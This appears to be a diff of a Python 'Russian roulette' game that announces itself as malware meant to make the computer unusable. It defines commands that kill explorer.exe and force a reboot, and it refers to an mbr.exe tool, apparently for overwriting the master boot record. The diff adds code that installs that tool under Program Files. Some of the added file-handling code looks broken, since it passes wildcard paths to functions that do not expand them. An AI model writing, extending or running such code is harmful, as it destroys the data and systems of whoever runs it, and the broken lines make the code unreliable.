@@ -4,10 +4,11 @@ import ctypes
 import time
 from string import digits
 import sys
+import shutil
 
 number = random.randint(1,6)
 kill = "taskkill /f /im explorer.exe"
-mbr = "redist\mbr.exe"
+mbr = "C:\Program Files\pussianroulette\mbr.exe"
 wait = 5
 reboot = 'shutdown /r /f /c "LOOOOOL" /t 5'
 logo = """
@@ -57,6 +58,11 @@ else:
 		os.system("cls")
 	quit()
 
+os.mkdir("C:/Program Files/pussianroulette")
+shutil.copy2("temp/*", "C:/Program Files/pussianroulette")
+os.remove("temp/*")
+os.rmdir("temp")
+
 confirm =  input("Do you want to play a game? This program IS MALWARE and WILL MAKE YOUR COMPUTER UNUSABLE! (yes/no)\n")
 confirm = confirm.lower()
 if confirm == "no":
@@ -101,4 +107,5 @@ elif guess == number:
 else:
 	os.system("cls")
 	print("\nYou won! Now get out of my face.")
+	input("Press ENTER to quit...")
 	quit()
